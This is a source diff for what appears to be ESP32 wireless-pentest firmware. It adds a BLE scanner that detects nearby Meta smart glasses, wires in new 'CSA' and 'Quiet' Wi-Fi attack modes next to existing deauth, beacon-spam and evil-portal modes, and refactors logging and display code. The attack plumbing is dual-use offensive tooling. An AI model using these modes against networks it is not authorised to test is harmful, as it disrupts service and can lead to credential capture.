@@ -75,6 +75,8 @@ extern "C" {
         memcpy(&AdvData_Raw[i], Name, name_len);
         i += name_len;
 
+        free((void*)Name);
+
         #ifndef HAS_NIMBLE_2
           AdvData.addData(std::string((char *)AdvData_Raw, 7 + name_len));
         #else
@@ -365,11 +367,10 @@ extern "C" {
               //Serial.println("Printing output to serial...");
               //Serial.flush();
               Serial.print(rssi);
-              Serial.print(F(" MAC: "));
-              Serial.println(mac);
-              Serial.print(F("Payload Len: "));
-              Serial.print(len);
-              Serial.println("\n");
+              Serial.println(" " + mac);
+              //Serial.print(F("Payload Len: "));
+              //Serial.print(len);
+              //Serial.println("\n");
 
               //Serial.println("Creating new airtag for list...");
               //Serial.flush();
@@ -442,7 +443,7 @@ extern "C" {
 
               int rssi = advertisedDevice->getRSSI();
               Serial.print(rssi);
-              Serial.print(F(" MAC: "));
+              Serial.print(F(" "));
               Serial.println(mac);
               Serial.print(F("Name: "));
               Serial.println(name);
@@ -464,7 +465,9 @@ extern "C" {
           else if (wifi_scan_obj.currentScanMode == BT_SCAN_ALL) {
             if (buf >= 0)
             {
-              display_string.concat(text_table4[0]);
+              #ifndef HAS_MINI_SCREEN
+                display_string.concat(text_table4[0]);
+              #endif
               display_string.concat(advertisedDevice->getRSSI());
               Serial.print(advertisedDevice->getRSSI());
       
@@ -539,7 +542,7 @@ extern "C" {
                     display_string.concat(" | Ln: " + gps_obj.getLon());
                   }
                   else {
-                    display_string.concat(" | GPS: No Fix");
+                    display_string.concat(F(" | GPS: No Fix"));
                   }
           
                   /*#ifdef HAS_SCREEN
@@ -705,19 +708,19 @@ extern "C" {
               int rssi = advertisedDevice->getRSSI();
 
               Serial.println(rssi);
-              Serial.print(F("  MAC:  "));
+              Serial.print(F(" "));
               Serial.println(mac);
               Serial.print(F("  Name: "));
               Serial.println(name);
               Serial.print(F("  Serial: "));
               Serial.println(serial.length() ? serial : "N/A");
 
-              Serial.print(F("  Payload: "));
-              for (size_t i = 0; i < len; i++) {
-                Serial.printf("%02X ", payLoad[i]);
-              }
-              Serial.println();
-              Serial.println();
+              //Serial.print(F("  Payload: "));
+              //for (size_t i = 0; i < len; i++) {
+              //  Serial.printf("%02X ", payLoad[i]);
+              //}
+              //Serial.println();
+              //Serial.println();
 
               #ifdef HAS_SCREEN
                 String display_string = "";
@@ -993,7 +996,101 @@ extern "C" {
 
             int frame_check = wifi_scan_obj.update_mac_entry(mac_char, advertisedDevice->getRSSI(), true);
           }
+          else if (wifi_scan_obj.currentScanMode == BT_SCAN_RAYBAN) { // Filters from https://github.com/NullPxl
+            bool match = false;
 
+            // Check manufacturer ID
+            if ((advertisedDevice->haveManufacturerData()) && (!match)) {
+              std::string m_data = advertisedDevice->getManufacturerData();
+              if (m_data.length() >= 2) {
+                uint16_t companyId = ((uint8_t)m_data[1] << 8) | (uint8_t)m_data[0];
+
+                if (wifi_scan_obj.isBlockedIdentifier(companyId)) {
+                  wifi_scan_obj.bt_cb_busy = false;
+                  return;
+                }
+
+                if (wifi_scan_obj.isMetaIdentifier(companyId))
+                  match = true;
+              }
+            }
+
+            // Check Service UUID
+            if ((advertisedDevice->haveServiceUUID()) && (!match)) {
+              for(int i = 0; i < advertisedDevice->getServiceUUIDCount(); i++) {
+                BLEUUID serviceUUID = advertisedDevice->getServiceUUID(i);
+                String uuidStr = String(serviceUUID.toString().c_str());
+                uuidStr.toLowerCase();
+                
+                uint16_t identifier = extract16BitFromUUID(uuidStr);
+
+                if (identifier != 0) {
+                  if (wifi_scan_obj.isBlockedIdentifier(identifier)) {
+                    wifi_scan_obj.bt_cb_busy = false;
+                    return;
+                  }
+
+                  if (wifi_scan_obj.isMetaIdentifier(identifier))
+                    match = true;
+                }
+              }
+            }
+
+            // Check Service Data
+            if ((advertisedDevice->haveServiceData()) && (!match)) {
+              BLEUUID svcDataUUID = advertisedDevice->getServiceDataUUID();
+              String uuidStr = String(svcDataUUID.toString().c_str());
+              uuidStr.toLowerCase();
+              
+              uint16_t identifier = extract16BitFromUUID(uuidStr);
+              if(identifier != 0) {
+                if (wifi_scan_obj.isBlockedIdentifier(identifier)) {
+                  wifi_scan_obj.bt_cb_busy = false;
+                  return;
+                }
+
+                if (wifi_scan_obj.isMetaIdentifier(identifier))
+                  match = true;
+              }
+            }
+
+            // Check for old MAC
+            if (match) {
+              unsigned char mac_char[6];
+              wifi_scan_obj.copyNimbleMac(advertisedDevice->getAddress(), mac_char);
+
+              if (!wifi_scan_obj.seen_mac(mac_char)) {
+                wifi_scan_obj.save_mac(mac_char);
+
+                display_string = "Meta Device: ";
+                display_string.concat((String)advertisedDevice->getRSSI());
+                display_string.concat(F(" "));
+                Serial.print(F("Meta Device: "));
+                Serial.print(advertisedDevice->getRSSI());
+                Serial.print(F(" "));
+                if(advertisedDevice->getName().length() != 0)
+                {
+                  display_string.concat(advertisedDevice->getName().c_str());
+                  Serial.println(advertisedDevice->getName().c_str());
+                }
+                else
+                {
+                  display_string.concat(advertisedDevice->getAddress().toString().c_str());
+                  Serial.println(advertisedDevice->getAddress().toString().c_str());
+                }
+
+                #ifdef HAS_SCREEN
+                  uint8_t temp_len = display_string.length();
+                  for (uint8_t i = 0; i < 40 - temp_len; i++)
+                  {
+                    display_string.concat(" ");
+                  }
+                    
+                  display_obj.display_buffer->add(display_string);
+                #endif
+              }
+            }
+          }
           wifi_scan_obj.bt_cb_busy = false;
           return;
         }
@@ -1064,11 +1161,11 @@ extern "C" {
               }
 
               Serial.print(rssi);
-              Serial.print(F(" MAC: "));
+              Serial.print(F(" "));
               Serial.println(mac);
-              Serial.print(F("Len: "));
-              Serial.print(len);
-              Serial.println("\n");
+              //Serial.print(F("Len: "));
+              //Serial.print(len);
+              //Serial.println("\n");
 
               AirTag airtag;
               airtag.mac = mac;
@@ -1088,7 +1185,7 @@ extern "C" {
               if (wifi_scan_obj.currentScanMode != BT_SCAN_AIRTAG_MON) {
                 #ifdef HAS_SCREEN
                   display_string.concat((String)rssi);
-                  display_string.concat(" MAC: ");
+                  display_string.concat(F(" MAC: "));
                   display_string.concat(mac);
                   uint8_t temp_len = display_string.length();
                   for (uint8_t i = 0; i < 40 - temp_len; i++)
@@ -1143,7 +1240,7 @@ extern "C" {
 
               int rssi = advertisedDevice->getRSSI();
               Serial.print(rssi);
-              Serial.print(F(" MAC: "));
+              Serial.print(F(" "));
               Serial.println(mac);
               Serial.print(F("Name: "));
               Serial.println(name);
@@ -1165,7 +1262,9 @@ extern "C" {
           else if (wifi_scan_obj.currentScanMode == BT_SCAN_ALL) {
             if (buf >= 0)
             {
-              display_string.concat(text_table4[0]);
+              #ifndef HAS_MINI_SCREEN
+                display_string.concat(text_table4[0]);
+              #endif
               display_string.concat(advertisedDevice->getRSSI());
               Serial.print(advertisedDevice->getRSSI());
       
@@ -1239,7 +1338,7 @@ extern "C" {
                     display_string.concat(" | Ln: " + gps_obj.getLon());
                   }
                   else {
-                    display_string.concat(" | GPS: No Fix");
+                    display_string.concat(F(" | GPS: No Fix"));
                   }
 
                   String wardrive_line = (String)advertisedDevice->getAddress().toString().c_str() + ",,[BLE]," + gps_obj.getDatetime() + ",0," + (String)advertisedDevice->getRSSI() + "," + gps_obj.getLat() + "," + gps_obj.getLon() + "," + gps_obj.getAlt() + "," + gps_obj.getAccuracy() + ",BLE\n";
@@ -1388,19 +1487,19 @@ extern "C" {
               int rssi = advertisedDevice->getRSSI();
 
               Serial.println(rssi);
-              Serial.print(F("  MAC:  "));
+              Serial.print(F(" "));
               Serial.println(mac);
               Serial.print(F("  Name: "));
               Serial.println(name);
               Serial.print(F("  Serial: "));
               Serial.println(serial.length() ? serial : "N/A");
 
-              Serial.print(F("  Payload: "));
-              for (size_t i = 0; i < len; i++) {
-                Serial.printf("%02X ", payLoad[i]);
-              }
-              Serial.println();
-              Serial.println();
+              //Serial.print(F("  Payload: "));
+              //for (size_t i = 0; i < len; i++) {
+              //  Serial.printf("%02X ", payLoad[i]);
+              //}
+              //Serial.println();
+              //Serial.println();
 
               #ifdef HAS_SCREEN
                 String display_string = "";
@@ -1676,6 +1775,101 @@ extern "C" {
 
             int frame_check = wifi_scan_obj.update_mac_entry(mac_char, advertisedDevice->getRSSI(), true);
           }
+          else if (wifi_scan_obj.currentScanMode == BT_SCAN_RAYBAN) { // Filters from https://github.com/NullPxl
+            bool match = false;
+
+            // Check manufacturer ID
+            if ((advertisedDevice->haveManufacturerData()) && (!match)) {
+              std::string m_data = advertisedDevice->getManufacturerData();
+              if (m_data.length() >= 2) {
+                uint16_t companyId = ((uint8_t)m_data[1] << 8) | (uint8_t)m_data[0];
+
+                if (wifi_scan_obj.isBlockedIdentifier(companyId)) {
+                  wifi_scan_obj.bt_cb_busy = false;
+                  return;
+                }
+
+                if (wifi_scan_obj.isMetaIdentifier(companyId))
+                  match = true;
+              }
+            }
+
+            // Check Service UUID
+            if ((advertisedDevice->haveServiceUUID()) && (!match)) {
+              for(int i = 0; i < advertisedDevice->getServiceUUIDCount(); i++) {
+                BLEUUID serviceUUID = advertisedDevice->getServiceUUID(i);
+                String uuidStr = String(serviceUUID.toString().c_str());
+                uuidStr.toLowerCase();
+                
+                uint16_t identifier = extract16BitFromUUID(uuidStr);
+
+                if (identifier != 0) {
+                  if (wifi_scan_obj.isBlockedIdentifier(identifier)) {
+                    wifi_scan_obj.bt_cb_busy = false;
+                    return;
+                  }
+
+                  if (wifi_scan_obj.isMetaIdentifier(identifier))
+                    match = true;
+                }
+              }
+            }
+
+            // Check Service Data
+            if ((advertisedDevice->haveServiceData()) && (!match)) {
+              BLEUUID svcDataUUID = advertisedDevice->getServiceDataUUID();
+              String uuidStr = String(svcDataUUID.toString().c_str());
+              uuidStr.toLowerCase();
+              
+              uint16_t identifier = extract16BitFromUUID(uuidStr);
+              if(identifier != 0) {
+                if (wifi_scan_obj.isBlockedIdentifier(identifier)) {
+                  wifi_scan_obj.bt_cb_busy = false;
+                  return;
+                }
+
+                if (wifi_scan_obj.isMetaIdentifier(identifier))
+                  match = true;
+              }
+            }
+
+            // Check for old MAC
+            if (match) {
+              unsigned char mac_char[6];
+              wifi_scan_obj.copyNimbleMac(advertisedDevice->getAddress(), mac_char);
+
+              if (!wifi_scan_obj.seen_mac(mac_char)) {
+                wifi_scan_obj.save_mac(mac_char);
+
+                display_string = "Meta Device: ";
+                display_string.concat((String)advertisedDevice->getRSSI());
+                display_string.concat(F(" "));
+                Serial.print(F("Meta Device: "));
+                Serial.print(advertisedDevice->getRSSI());
+                Serial.print(F(" "));
+                if(advertisedDevice->getName().length() != 0)
+                {
+                  display_string.concat(advertisedDevice->getName().c_str());
+                  Serial.println(advertisedDevice->getName().c_str());
+                }
+                else
+                {
+                  display_string.concat(advertisedDevice->getAddress().toString().c_str());
+                  Serial.println(advertisedDevice->getAddress().toString().c_str());
+                }
+
+                #ifdef HAS_SCREEN
+                  uint8_t temp_len = display_string.length();
+                  for (uint8_t i = 0; i < 40 - temp_len; i++)
+                  {
+                    display_string.concat(" ");
+                  }
+                    
+                  display_obj.display_buffer->add(display_string);
+                #endif
+              }
+            }
+          }
 
           wifi_scan_obj.bt_cb_busy = false;
 
@@ -1684,11 +1878,6 @@ extern "C" {
     };
   #endif
 #endif
-
-
-WiFiScan::WiFiScan()
-{
-}
 
 void WiFiScan::RunSetup() {
   if (ieee80211_raw_frame_sanity_check(31337, 0, 0) == 1)
@@ -1717,6 +1906,8 @@ void WiFiScan::RunSetup() {
   confirmed_multissid = new LinkedList<ConfirmedMultiSSID>();
   multissid_list_full_reported = false;
 
+  settings_obj.loadSetting<bool>("ChanHop");
+
   #ifdef HAS_PSRAM
     mac_history = (struct mac_addr*) ps_malloc(mac_history_len * sizeof(struct mac_addr));
   #endif
@@ -1725,28 +1916,22 @@ void WiFiScan::RunSetup() {
     mac_entry_state[i] = 0;
 
   #ifdef HAS_BT
-    watch_models = new WatchModel[26] {
+    watch_models = new WatchModel[20] {
       {0x1A, "Fallback Watch"},
-      {0x01, "White Watch4 Classic 44m"},
       {0x02, "Black Watch4 Classic 40m"},
       {0x03, "White Watch4 Classic 40m"},
-      {0x04, "Black Watch4 44mm"},
-      {0x05, "Silver Watch4 44mm"},
       {0x06, "Green Watch4 44mm"},
       {0x07, "Black Watch4 40mm"},
       {0x08, "White Watch4 40mm"},
       {0x09, "Gold Watch4 40mm"},
-      {0x0A, "French Watch4"},
       {0x0B, "French Watch4 Classic"},
       {0x0C, "Fox Watch5 44mm"},
       {0x11, "Black Watch5 44mm"},
       {0x12, "Sapphire Watch5 44mm"},
-      {0x13, "Purpleish Watch5 40mm"},
       {0x14, "Gold Watch5 40mm"},
       {0x15, "Black Watch5 Pro 45mm"},
       {0x16, "Gray Watch5 Pro 45mm"},
       {0x17, "White Watch5 44mm"},
-      {0x18, "White & Black Watch5"},
       {0x1B, "Black Watch6 Pink 40mm"},
       {0x1C, "Gold Watch6 Gold 40mm"},
       {0x1D, "Silver Watch6 Cyan 44mm"},
@@ -1762,7 +1947,7 @@ void WiFiScan::RunSetup() {
     
     this->shutdownBLE();
 
-    Serial.println("Initializing WiFi...");
+    //Serial.println("Initializing WiFi...");
 
     esp_wifi_init(&cfg);
     #ifdef HAS_IDF_3
@@ -1775,13 +1960,27 @@ void WiFiScan::RunSetup() {
     esp_wifi_get_mac(WIFI_IF_STA, this->sta_mac);
     delay(10);
     esp_wifi_get_mac(WIFI_IF_AP, this->ap_mac);
-    Serial.println("Setting MAC...");
+    //Serial.println("Setting MAC...");
     this->setMac();
-    Serial.println("Shutting down WiFi...");
+    //Serial.println("Shutting down WiFi...");
     this->shutdownWiFi();
   #endif
 
   this->initWiFi(1);
+}
+
+bool WiFiScan::isMetaIdentifier(uint16_t id) {
+  for(int i = 0; i < sizeof(META_IDENTIFIERS) / sizeof(META_IDENTIFIERS[0]); i++) {
+    if(META_IDENTIFIERS[i] == id) return true;
+  }
+  return false;
+}
+
+bool WiFiScan::isBlockedIdentifier(uint16_t id) {
+  for(int i = 0; i < sizeof(BLOCKED_IDENTIFIERS) / sizeof(BLOCKED_IDENTIFIERS[0]); i++) {
+    if(BLOCKED_IDENTIFIERS[i] == id) return true;
+  }
+  return false;
 }
 
 bool WiFiScan::isHostAlive(IPAddress ip) {
@@ -1845,11 +2044,11 @@ int WiFiScan::clearSSIDs() {
 }
 
 bool WiFiScan::addSSID(String essid) {
-  #ifndef HAS_DUAL_BAND
-    ssid s = {essid, random(1, 12), {random(256), random(256), random(256), random(256), random(256), random(256)}, false};
-  #else
-    ssid s = {essid, dual_band_channels[random(0, DUAL_BAND_CHANNELS)], {random(256), random(256), random(256), random(256), random(256), random(256)}, false};
-  #endif
+  //#ifndef HAS_DUAL_BAND
+    ssid s = {essid, random(1, 15), {random(256), random(256), random(256), random(256), random(256), random(256)}, false};
+  //#else
+  //  ssid s = {essid, dual_band_channels[random(0, DUAL_BAND_CHANNELS)], {random(256), random(256), random(256), random(256), random(256), random(256)}, false};
+  //#endif
   ssids->add(s);
   Serial.println(ssids->get(ssids->size() - 1).essid);
 
@@ -1864,11 +2063,11 @@ int WiFiScan::generateSSIDs(int count) {
     for (uint8_t i = 0; i < 6; i++)
       essid.concat(alfa[random(65)]);
 
-    #ifndef HAS_DUAL_BAND
-      ssid s = {essid, random(1, 12), {random(256), random(256), random(256), random(256), random(256), random(256)}, false};
-    #else
-      ssid s = {essid, dual_band_channels[random(0, DUAL_BAND_CHANNELS)], {random(256), random(256), random(256), random(256), random(256), random(256)}, false};
-    #endif
+    //#ifndef HAS_DUAL_BAND
+      ssid s = {essid, random(1, 15), {random(256), random(256), random(256), random(256), random(256), random(256)}, false};
+    //#else
+    //  ssid s = {essid, dual_band_channels[random(0, DUAL_BAND_CHANNELS)], {random(256), random(256), random(256), random(256), random(256), random(256)}, false};
+    //#endif
     ssids->add(s);
     Serial.println(ssids->get(ssids->size() - 1).essid);
   }
@@ -1891,6 +2090,20 @@ void WiFiScan::showNetworkInfo() {
   Serial.println(this->subnet);
   Serial.print(F("MAC: "));
   Serial.println(WiFi.macAddress());
+
+  #ifdef HAS_SCREEN
+    display_obj.tft.println("\nConnected!");
+    display_obj.tft.print("IP address: ");
+    display_obj.tft.println(this->ip_addr);
+    display_obj.tft.print("Gateway: ");
+    display_obj.tft.println(this->gateway);
+    display_obj.tft.print("Netmask: ");
+    display_obj.tft.println(this->subnet);
+    display_obj.tft.print("MAC: ");
+    display_obj.tft.println(WiFi.macAddress());
+    display_obj.tft.println("Returning...");
+    delay(2000);
+  #endif
 }
 
 bool WiFiScan::joinWiFi(String ssid, String password, bool gui) {
@@ -1903,7 +2116,7 @@ bool WiFiScan::joinWiFi(String ssid, String password, bool gui) {
     return true;
   }
   else if (WiFi.status() == WL_CONNECTED) {
-    Serial.println(F("Already connected. Disconnecting..."));
+    //Serial.println(F("Already connected. Disconnecting..."));
     WiFi.disconnect();
   }
 
@@ -1958,19 +2171,6 @@ bool WiFiScan::joinWiFi(String ssid, String password, bool gui) {
   this->setNetworkInfo();  
   this->showNetworkInfo();
 
-  #ifdef HAS_SCREEN
-    display_obj.tft.println("\nConnected!");
-    display_obj.tft.print("IP address: ");
-    display_obj.tft.println(this->ip_addr);
-    display_obj.tft.print("Gateway: ");
-    display_obj.tft.println(this->gateway);
-    display_obj.tft.print("Netmask: ");
-    display_obj.tft.println(this->subnet);
-    display_obj.tft.print("MAC: ");
-    display_obj.tft.println(WiFi.macAddress());
-    display_obj.tft.println("Returning...");
-    delay(2000);
-  #endif
   this->wifi_initialized = true;
   #ifndef HAS_TOUCH
     this->currentScanMode = WIFI_CONNECTED;
@@ -1985,7 +2185,7 @@ bool WiFiScan::joinWiFi(String ssid, String password, bool gui) {
   return true;
 }
 
-bool WiFiScan::startWiFi(String ssid, String password, bool gui) {
+/*bool WiFiScan::startWiFi(String ssid, String password, bool gui) {
   static const char * btns[] ={text16, ""};
   int count = 0;
   
@@ -1995,7 +2195,7 @@ bool WiFiScan::startWiFi(String ssid, String password, bool gui) {
     return true;
   }
   else if (WiFi.status() == WL_CONNECTED) {
-    Serial.println(F("Already connected. Disconnecting..."));
+    //Serial.println(F("Already connected. Disconnecting..."));
     WiFi.disconnect();
   }
 
@@ -2028,19 +2228,6 @@ bool WiFiScan::startWiFi(String ssid, String password, bool gui) {
   
   this->showNetworkInfo();
 
-  #ifdef HAS_SCREEN
-    display_obj.tft.println(F("\nStarted AP"));
-    display_obj.tft.print(F("IP address: "));
-    display_obj.tft.println(this->ip_addr);
-    display_obj.tft.print(F("Gateway: "));
-    display_obj.tft.println(this->gateway);
-    display_obj.tft.print(F("Netmask: "));
-    display_obj.tft.println(this->subnet);
-    display_obj.tft.print(F("MAC: "));
-    display_obj.tft.println(WiFi.macAddress());
-    display_obj.tft.println(F("Returning..."));
-    delay(2000);
-  #endif
   this->wifi_initialized = true;
   this->currentScanMode = WIFI_CONNECTED;
   #ifdef HAS_SCREEN
@@ -2048,7 +2235,7 @@ bool WiFiScan::startWiFi(String ssid, String password, bool gui) {
   #endif
 
   return true;
-}
+}*/
 
 // Apply WiFi settings
 void WiFiScan::initWiFi(uint8_t scan_mode) {
@@ -2111,8 +2298,8 @@ void WiFiScan::StartScan(uint8_t scan_mode, uint16_t color) {
     RunRawScan(scan_mode, color);    
   else if (scan_mode == WIFI_SCAN_RAW_CAPTURE)
     RunRawScan(scan_mode, color);
-  else if (scan_mode == WIFI_SCAN_STATION)
-    RunStationScan(scan_mode, color);
+  //else if (scan_mode == WIFI_SCAN_STATION)
+  //  RunStationScan(scan_mode, color);
   else if (scan_mode == WIFI_SCAN_TARGET_AP)
     RunAPScan(scan_mode, color);
   else if (scan_mode == WIFI_SCAN_TARGET_AP_FULL)
@@ -2143,6 +2330,10 @@ void WiFiScan::StartScan(uint8_t scan_mode, uint16_t color) {
     this->startWiFiAttacks(scan_mode, color, text_table1[50]);
   else if (scan_mode == WIFI_ATTACK_BEACON_SPAM)
     this->startWiFiAttacks(scan_mode, color, text_table1[51]);
+  else if (scan_mode == WIFI_ATTACK_CSA)
+    this->startWiFiAttacks(scan_mode, color, "CSA Attack");
+  else if (scan_mode == WIFI_ATTACK_QUIET)
+   this->startWiFiAttacks(scan_mode, color, "Quiet Attack");
   else if (scan_mode == WIFI_ATTACK_RICK_ROLL)
     this->startWiFiAttacks(scan_mode, color, text_table1[52]);
   else if (scan_mode == WIFI_ATTACK_FUNNY_BEACON)
@@ -2168,6 +2359,7 @@ void WiFiScan::StartScan(uint8_t scan_mode, uint16_t color) {
   else if (scan_mode == WIFI_ATTACK_AP_SPAM)
     this->startWiFiAttacks(scan_mode, color, " AP Beacon Spam ");
   else if ((scan_mode == BT_SCAN_ALL) ||
+          (scan_mode == BT_SCAN_RAYBAN) ||
           (scan_mode == BT_SCAN_AIRTAG) ||
           (scan_mode == BT_SCAN_AIRTAG_MON) ||
           (scan_mode == BT_SCAN_FLIPPER) ||
@@ -2244,16 +2436,44 @@ void WiFiScan::StartScan(uint8_t scan_mode, uint16_t color) {
   this->currentScanMode = scan_mode;
 }
 
+void WiFiScan::setLEDMode(int mode) {
+  if (mode == MODE_ATTACK) {
+    #ifdef HAS_FLIPPER_LED
+      flipper_led.attackLED();
+    #elif defined(XIAO_ESP32_S3)
+      xiao_led.attackLED();
+    #elif defined(MARAUDER_M5STICKC)
+      stickc_led.attackLED();
+    #elif defined(HAS_NEOPIXEL_LED)
+      led_obj.setMode(MODE_ATTACK);
+    #endif
+  } else if (mode == MODE_SNIFF) {
+    #ifdef HAS_FLIPPER_LED
+      flipper_led.sniffLED();
+    #elif defined(XIAO_ESP32_S3)
+      xiao_led.sniffLED();
+    #elif defined(MARAUDER_M5STICKC)
+      stickc_led.sniffLED();
+    #elif defined(HAS_NEOPIXEL_LED)
+      led_obj.setMode(MODE_SNIFF);
+    #endif
+  } else if (mode == MODE_OFF) {
+    #ifdef HAS_FLIPPER_LED
+      flipper_led.offLED();
+    #elif defined(XIAO_ESP32_S3)
+      xiao_led.offLED();
+    #elif defined(MARAUDER_M5STICKC)
+      stickc_led.offLED();
+    #elif defined(HAS_NEOPIXEL_LED)
+      led_obj.setMode(MODE_OFF);
+    #endif
+  }
+}
+
 void WiFiScan::startWiFiAttacks(uint8_t scan_mode, uint16_t color, String title_string) {
   // Common wifi attack configurations
   #ifdef HAS_SCREEN
-    display_obj.TOP_FIXED_AREA_2 = 48;
-    display_obj.tteBar = true;
-    display_obj.print_delay_1 = 15;
-    display_obj.print_delay_2 = 10;
-    display_obj.initScrollValues(true);
-    display_obj.tft.setTextWrap(false);
-    display_obj.tft.setTextColor(TFT_BLACK, color);
+    this->setupScanDisplayArea(TFT_BLACK, color);
     #ifdef HAS_FULL_SCREEN
       display_obj.tft.fillRect(0,16,TFT_WIDTH,16, color);
       display_obj.tft.drawCentreString((String)title_string,TFT_WIDTH / 2,16,2);
@@ -2303,7 +2523,8 @@ void WiFiScan::startWiFiAttacks(uint8_t scan_mode, uint16_t color, String title_
   esp_wifi_set_promiscuous(true);
   esp_wifi_set_max_tx_power(82);
   this->wifi_initialized = true;
-  #ifdef HAS_FLIPPER_LED
+  this->setLEDMode(MODE_ATTACK);
+  /*#ifdef HAS_FLIPPER_LED
     flipper_led.attackLED();
   #elif defined(XIAO_ESP32_S3)
     xiao_led.attackLED();
@@ -2311,7 +2532,7 @@ void WiFiScan::startWiFiAttacks(uint8_t scan_mode, uint16_t color, String title_
     stickc_led.attackLED();
   #else
     led_obj.setMode(MODE_ATTACK);
-  #endif
+  #endif*/
   initTime = millis();
 }
 
@@ -2331,7 +2552,8 @@ bool WiFiScan::shutdownWiFi() {
       esp_netif_deinit(); 
     }
 
-    #ifdef HAS_FLIPPER_LED
+    this->setLEDMode(MODE_OFF);
+    /*#ifdef HAS_FLIPPER_LED
       flipper_led.offLED();
     #elif defined(XIAO_ESP32_S3)
       xiao_led.offLED();
@@ -2339,7 +2561,7 @@ bool WiFiScan::shutdownWiFi() {
       stickc_led.offLED();
     #else
       led_obj.setMode(MODE_OFF);
-    #endif
+    #endif*/
 
     this->_analyzer_value = 0;
   
@@ -2358,15 +2580,15 @@ bool WiFiScan::shutdownBLE() {
     this->bt_cb_busy = false;
     this->bt_pending_clear = false;
     if (this->ble_initialized) {
-      Serial.println(F("Shutting down BLE"));
-      pAdvertising->stop();
-      pBLEScan->stop();
-      
-      pBLEScan->clearResults();
+      //Serial.println(F("Shutting down BLE"));
+      if (pAdvertising) pAdvertising->stop();
+      if (pBLEScan) pBLEScan->stop();
+
+      if (pBLEScan) pBLEScan->clearResults();
 
       delay(100);
 
-      Serial.println("Deinitializing NimBLE...");
+      //Serial.println("Deinitializing NimBLE...");
 
       //#ifndef HAS_DUAL_BAND
         NimBLEDevice::deinit();
@@ -2381,7 +2603,8 @@ bool WiFiScan::shutdownBLE() {
       return false;
     }
 
-    #ifdef HAS_FLIPPER_LED
+    this->setLEDMode(MODE_OFF);
+    /*#ifdef HAS_FLIPPER_LED
       flipper_led.offLED();
     #elif defined(XIAO_ESP32_S3)
       xiao_led.offLED();
@@ -2389,7 +2612,7 @@ bool WiFiScan::shutdownBLE() {
       stickc_led.offLED();
     #else
       led_obj.setMode(MODE_OFF);
-    #endif
+    #endif*/
 
   #endif
 
@@ -2415,8 +2638,7 @@ int WiFiScan::clearMultiSSID() {
 }
 
 // Function to stop all wifi scans
-void WiFiScan::StopScan(uint8_t scan_mode)
-{
+void WiFiScan::StopScan(uint8_t scan_mode) {
   if ((currentScanMode == WIFI_SCAN_PROBE) ||
   (currentScanMode == WIFI_SCAN_SAE_COMMIT) ||
   (currentScanMode == WIFI_SCAN_AP) ||
@@ -2449,6 +2671,8 @@ void WiFiScan::StopScan(uint8_t scan_mode)
   (currentScanMode == WIFI_SCAN_DEAUTH) ||
   (currentScanMode == WIFI_ATTACK_BEACON_LIST) ||
   (currentScanMode == WIFI_ATTACK_BEACON_SPAM) ||
+  (currentScanMode == WIFI_ATTACK_CSA) ||
+  (currentScanMode == WIFI_ATTACK_QUIET) ||
   (currentScanMode == WIFI_ATTACK_AUTH) ||
   (currentScanMode == WIFI_ATTACK_DEAUTH) ||
   (currentScanMode == WIFI_ATTACK_DEAUTH_MANUAL) ||
@@ -2461,6 +2685,7 @@ void WiFiScan::StopScan(uint8_t scan_mode)
   (currentScanMode == WIFI_ATTACK_MIMIC) ||
   (currentScanMode == WIFI_ATTACK_RICK_ROLL) ||
   (currentScanMode == WIFI_ATTACK_FUNNY_BEACON) ||
+  (currentScanMode == WIFI_ATTACK_AP_SPAM) ||
   (currentScanMode == WIFI_PACKET_MONITOR) ||
   (currentScanMode == WIFI_SCAN_CHAN_ANALYZER) ||
   (currentScanMode == WIFI_SCAN_CHAN_ACT) ||
@@ -2496,6 +2721,8 @@ void WiFiScan::StopScan(uint8_t scan_mode)
       this->eapol_frames = 0;
       this->min_rssi = 0;
       this->max_rssi = -128;
+      this->send_deauth = false;
+      this->complete_eapol = 0;
 
       evil_portal_obj.cleanup();
     #endif
@@ -2509,6 +2736,7 @@ void WiFiScan::StopScan(uint8_t scan_mode)
 
   
   if ((currentScanMode == BT_SCAN_ALL) ||
+  (currentScanMode == BT_SCAN_RAYBAN) ||
   (currentScanMode == BT_SCAN_AIRTAG) ||
   (currentScanMode == BT_SCAN_AIRTAG_MON) ||
   (currentScanMode == BT_SCAN_FLIPPER) ||
@@ -2627,22 +2855,6 @@ bool WiFiScan::seen_mac(unsigned char* mac, bool simple) {
     }
   }
   return false;
-}
-
-int16_t WiFiScan::seen_mac_int(unsigned char* mac, bool simple) {
-  //Return true if this MAC address is in the recently seen array.
-
-  uint8_t tmp[6];
-  for (int x = 0; x < 6 ; x++) {
-    tmp[x] = mac[x];
-  }
-
-  for (int x = 0; x < mac_history_len_half; x++) {
-    if (this->mac_cmp(tmp, mac_entries[x].mac)) {
-      return x;
-    }
-  }
-  return -1;
 }
 
 inline uint32_t WiFiScan::hash_mac(const uint8_t mac[6]) {
@@ -2792,7 +3004,7 @@ void WiFiScan::evict_and_insert(const uint8_t mac[6], uint32_t now_ms) {
     // Overwrite victim with new entry
     insert_mac_entry((uint32_t)victim, mac, now_ms);
 
-    Serial.println(macToString(evicted_mac) + " expired");
+    //Serial.println(macToString(evicted_mac) + " expired");
     return;
   }
 
@@ -3006,14 +3218,6 @@ void WiFiScan::clearMacHistory() {
     }
 }
 
-String WiFiScan::freeRAM()
-{
-  char s[150];
-  sprintf(s, "RAM Free: %u bytes", esp_get_free_heap_size());
-  this->free_ram = String(esp_get_free_heap_size());
-  return String(s);
-}
-
 void WiFiScan::startPcap(String file_name) {
   buffer_obj.pcapOpen(
     file_name,
@@ -3047,62 +3251,25 @@ void WiFiScan::startGPX(String file_name) {
   );
 }
 
-void WiFiScan::parseBSSID(const char* bssidStr, uint8_t* bssid) {
+/*void WiFiScan::parseBSSID(const char* bssidStr, uint8_t* bssid) {
   sscanf(bssidStr, "%02X:%02X:%02X:%02X:%02X:%02X",
          &bssid[0], &bssid[1], &bssid[2],
          &bssid[3], &bssid[4], &bssid[5]);
-}
+}*/
 
-void WiFiScan::RunPingScan(uint8_t scan_mode, uint16_t color)
-{
-  if (scan_mode == WIFI_PING_SCAN)
-    startLog("pingscan");
-  else if (scan_mode == WIFI_ARP_SCAN)
-    startLog("arpscan");
-
-  #ifdef HAS_FLIPPER_LED
-    flipper_led.sniffLED();
-  #elif defined(XIAO_ESP32_S3)
-    xiao_led.sniffLED();
-  #elif defined(MARAUDER_M5STICKC)
-    stickc_led.sniffLED();
-  #else
-    led_obj.setMode(MODE_SNIFF);
-  #endif
-  
+void WiFiScan::setupScanDisplayArea(uint16_t background, uint16_t color) {
   #ifdef HAS_SCREEN
     display_obj.TOP_FIXED_AREA_2 = 48;
